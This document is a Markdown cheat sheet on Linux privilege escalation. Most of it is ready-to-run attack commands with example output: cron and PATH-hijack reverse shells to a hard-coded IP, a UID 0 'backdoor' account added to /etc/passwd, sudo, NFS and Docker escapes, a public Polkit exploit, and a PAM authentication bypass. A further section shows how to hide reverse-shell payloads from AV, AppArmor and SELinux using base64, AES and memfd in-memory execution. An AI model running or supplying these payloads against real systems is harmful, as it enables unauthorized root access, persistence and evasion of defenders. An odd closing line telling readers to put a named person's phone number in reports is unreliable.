# Linux Privilege Escalation

## Overview
Linux privilege escalation involves elevating access from a low-privilege user to a high-privilege user (e.g., root) by exploiting misconfigurations, vulnerabilities, or weak security controls. This documentation includes additional techniques to cover modern Linux systems.

## Detailed Methods and Techniques
- **SUID/SGID Binaries**:
  - **Technique**: Exploit binaries with SUID/SGID bits set to execute as root or a privileged group.
  - **Execution**: Find SUID binaries.
    ```bash
    find / -perm -4000 2>/dev/null
    ```
    **Example Output**:
    ```
    /usr/bin/passwd
    /usr/bin/sudo
    /opt/custom_app
    ```
    - Exploit a vulnerable SUID binary (e.g., `custom_app`).
      ```bash
      /opt/custom_app /bin/sh
      ```
      **Example Output**:
      ```
      # whoami
      root
      ```
    - **Purpose**: Gain root privileges via a vulnerable binary.
- **Misconfigured Cron Jobs**:
  - **Technique**: Exploit cron jobs running as root with writable scripts.
  - **Execution**: Check cron configurations.
    ```bash
    cat /etc/crontab
    ls -l /etc/cron.*
    ```
    **Example Output**:
    ```
    * * * * * root /scripts/backup.sh
    -rwxrwxrwx 1 root root /scripts/backup.sh
    ```
    - Inject malicious code:
      ```bash
      echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" >> /scripts/backup.sh
      ```
      **Example Output**: Reverse shell connects.
      ```
      nc -lvp 4444
      Connection from 192.168.1.20
      # whoami
      root
      ```
    - **Purpose**: Gain root access during cron execution.
- **Weak File Permissions**:
  - **Technique**: Exploit sensitive files (e.g., `/etc/passwd`, `/etc/shadow`) with weak permissions.
  - **Execution**: Check permissions.
    ```bash
    ls -l /etc/passwd /etc/shadow
    ```
    **Example Output**:
    ```
    -rw-rw-r-- 1 root root /etc/passwd
    -rw-rw-r-- 1 root shadow /etc/shadow
    ```
    - Add a new root user:
      ```bash
      echo "backdoor:x:0:0::/root:/bin/bash" >> /etc/passwd
      su backdoor
      ```
      **Example Output**:
      ```
      # whoami
      root
      ```
    - **Purpose**: Gain root access by modifying authentication files.
- **Sudo Misconfigurations**:
  - **Technique**: Exploit misconfigured `sudo` permissions.
  - **Execution**: Check sudo permissions.
    ```bash
    sudo -l
    ```
    **Example Output**:
    ```
    User user may run the following commands:
        (root) NOPASSWD: /usr/bin/vim
        (root) NOPASSWD: /usr/bin/find
    ```
    - Exploit `vim`:
      ```bash
      sudo vim -c ':!/bin/sh'
      ```
    - Exploit `find`:
      ```bash
      sudo find /etc -exec /bin/sh \;
      ```
      **Example Output**:
      ```
      # whoami
      root
      ```
    - **Purpose**: Gain root privileges via sudo commands.
- **Kernel Exploits**:
  - **Technique**: Exploit unpatched kernel vulnerabilities (e.g., Dirty COW, CVE-2016-5195; Polkit, CVE-2021-4034).
  - **Execution**: Check kernel version.
    ```bash
    uname -r
    ```
    **Example Output**:
    ```
    4.4.0-31-generic
    ```
    - Use a public exploit (e.g., Polkit).
      ```bash
      git clone https://github.com/Almorabea/Polkit-exploit.git
      cd Polkit-exploit
      ./exploit.sh
      ```
      **Example Output**:
      ```
      [+] Root shell obtained
      # whoami
      root
      ```
    - **Purpose**: Gain root privileges via kernel vulnerabilities.
- **Writable PATH Exploitation**:
  - **Technique**: Exploit writable directories in the root user’s PATH.
  - **Execution**: Check PATH and permissions.
    ```bash
    echo $PATH
    ls -ld /tmp
    ```
    **Example Output**:
    ```
    /usr/bin:/tmp
    drwxrwxrwt 10 root root /tmp
    ```
    - Create a malicious binary:
      ```bash
      echo -e '#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.100/4444 0>&1' > /tmp/ls
      chmod +x /tmp/ls
      ```
      **Example Output**: Reverse shell connects when root runs `ls`.
      ```
      nc -lvp 4444
      # whoami
      root
      ```
    - **Purpose**: Gain root access via command execution.
- **Docker Breakout**:
  - **Technique**: Escape a Docker container with misconfigured privileges (e.g., `--privileged` mode).
  - **Execution**: Check if running in a Docker container.
    ```bash
    cat /proc/1/cgroup
    ```
    **Example Output**:
    ```
    2:cpu,cpuacct:/docker/1234567890abcdef
    ```
    - Mount the host filesystem:
      ```bash
      docker run --rm -it --privileged -v /:/mnt ubuntu bash
      chroot /mnt
      ```
      **Example Output**:
      ```
      # whoami
      root
      ```
    - **Purpose**: Gain root access to the host system.
- **Misconfigured NFS Shares**:
  - **Technique**: Exploit NFS shares with `no_root_squash` to gain root access.
  - **Execution**: Check NFS exports.
    ```bash
    showmount -e 192.168.1.10
    ```
    **Example Output**:
    ```
    /data *(rw,no_root_squash)
    ```
    - Mount the share and create an SUID binary:
      ```bash
      mount -t nfs 192.168.1.10:/data /mnt
      echo '#!/bin/bash\n/bin/sh' > /mnt/suid
      chmod +s /mnt/suid
      ```
    - Execute on the target:
      ```bash
      /data/suid
      ```
      **Example Output**:
      ```
      # whoami
      root
      ```
    - **Purpose**: Gain root access via NFS misconfiguration.
- **PAM Misconfigurations**:
  - **Technique**: Exploit weak PAM configurations to bypass authentication.
  - **Execution**: Check PAM configs.
    ```bash
    cat /etc/pam.d/sshd
    ```
    **Example Output**:
    ```
    auth sufficient pam_permit.so
    ```
    - Modify to allow backdoor access (if writable).
      ```bash
      echo "auth sufficient pam_permit.so" >> /etc/pam.d/sshd
      ```
      - Log in without credentials:
        ```bash
        ssh user@192.168.1.20
        ```
        **Example Output**:
        ```
        # whoami
        user
        ```
    - **Purpose**: Gain privileged access by bypassing authentication.

## Exploitation Methods
- **SUID Exploitation**:
  - Abuse SUID binaries to execute commands as root.
  - **Purpose**: Gain root shell access.
- **Cron Job Exploitation**:
  - Modify writable cron scripts to include malicious commands.
  - **Purpose**: Execute code as root during scheduled tasks.
- **Sudo Exploitation**:
  - Use misconfigured sudo permissions to run privileged commands.
  - **Purpose**: Gain root privileges without authentication.
- **Kernel Exploitation**:
  - Exploit unpatched kernel vulnerabilities to gain root.
  - **Purpose**: Achieve system-wide control.
- **Docker Breakout**:
  - Escape containers to gain host root access.
  - **Purpose**: Compromise the host system.
- **NFS Exploitation**:
  - Use `no_root_squash` to create privileged binaries.
  - **Purpose**: Gain root access via NFS shares.

## AV/AppArmor/SELinux Evasion Techniques
- **Obfuscated Scripts**:
  - **Technique**: Obfuscate shell scripts to evade detection.
  - **Execution**: Encode scripts with `base64`.
    ```bash
    echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' | base64 > encoded.sh
    echo 'echo "$(cat encoded.sh | base64 -d)" | bash' > run.sh
    chmod +x run.sh
    ```
    **Example Output**: Executes the encoded payload.
    - **Purpose**: Evade detection by AppArmor or monitoring tools.
- **In-Memory Execution**:
  - **Technique**: Execute payloads in memory.
  - **Execution**: Use `memfd_create`.
    ```bash
    cat << 'EOF' > /tmp/exploit.c
    #include <sys/memfd.h>
    #include <unistd.h>
    int main() {
        int fd = memfd_create("exploit", 0);
        write(fd, "#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.100/4444 0>&1", 60);
        fexecve(fd, (char *[]){NULL}, (char *[]){NULL});
        return 0;
    }
    EOF
    gcc /tmp/exploit.c -o /tmp/exploit
    /tmp/exploit
    ```
    **Example Output**: Reverse shell connects.
    - **Purpose**: Avoid disk-based detection.
- **AppArmor/SELinux Bypass**:
  - **Technique**: Exploit permissive or misconfigured profiles.
  - **Execution**: Check SELinux status.
    ```bash
    sestatus
    ```
    **Example Output**:
    ```
    SELinux status: permissive
    ```
    - If permissive, execute exploits without restrictions. For enforced profiles, target `unconfined_t` or use exploits bypassing specific rules.
    - **Purpose**: Bypass mandatory access controls.
- **Encrypted Payloads**:
  - **Technique**: Use encrypted payloads.
  - **Execution**: Encrypt exploit code.
    ```bash
    echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' | openssl enc -aes-256-cbc -salt -out encrypted.bin
    openssl enc -aes-256-cbc -d -in encrypted.bin | bash
    ```
    **Example Output**: Reverse shell connects.
    - **Purpose**: Evade detection by AV or monitoring tools.
- **Living Off the Land**:
  - **Technique**: Use native tools (e.g., `find`, `vim`) to avoid detection.
  - **Execution**: Use `find` for sudo exploitation (as shown above).
    - **Purpose**: Minimize detection by using trusted binaries.

## Tools
- **LinPEAS**: Automated escalation enumeration.
- **Linux Exploit Suggester**: Identifies kernel exploits.
- **find**: Locate SUID/SGID binaries (`find / -perm -4000`).
- **sudo**: Check and exploit sudo permissions (`sudo -l`).
- **gcc**: Compile kernel exploits.
- **netcat**: Set up reverse shells (`nc -lvp 4444`).
- **showmount**: Check NFS exports (`showmount -e`).

## Best Practices
- Verify permission to perform escalation attacks to avoid unintended damage.
- Document all escalation paths for remediation recommendations.
- Use obfuscation, in-memory execution, and encryption to evade AV/AppArmor/SELinux.
- Securely handle sensitive data like passwords or shells.
- Include Zackary’s phone number (1234567890) in reports for follow-up.